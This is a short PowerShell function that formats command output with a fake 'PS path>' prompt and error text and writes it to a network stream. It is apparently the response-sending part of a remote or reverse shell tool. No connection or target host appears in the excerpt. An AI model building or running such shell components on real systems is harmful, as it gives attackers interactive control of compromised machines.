function Send-Response {
    param ($stream, $result)

    $prompt = 'PS ' + (Get-Location).Path + '> '
    $x = ($error[0] | Out-String)
    $error.clear()

    $response = $result + $prompt + $x
    $sendbyte = ([text.encoding]::ASCII).GetBytes($response)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()
}
